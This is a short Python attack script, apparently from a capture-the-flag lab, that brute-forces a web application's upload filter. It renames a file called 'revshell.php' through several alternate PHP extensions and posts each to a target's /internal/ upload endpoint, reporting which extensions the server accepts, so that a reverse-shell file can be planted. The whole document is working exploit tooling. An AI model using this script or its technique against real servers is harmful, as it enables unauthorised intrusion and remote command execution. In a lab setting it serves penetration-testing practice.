import requests
import os

ip = "10.10.142.21"
url = f"http://{ip}:3333/internal/"

old_filename = "revshell.php"
filename = "revshell"
extentions = [
    ".php",
    ".php3",
    ".php4",
    ".php5",
    ".phtml"
]

for ext in extentions: 
    new_filename = filename + ext
    os.rename(old_filename, new_filename)
    files = {"file" : open(new_filename, "rb")}
    r = requests.post(url, files=files)
    
    #print(r.text)
    if "Extension not allowed" in r.text:
        print(f"{ext} not allowed")
    else:
        print(f"{ext} seem to be allowed")
        
    old_filename = new_filename
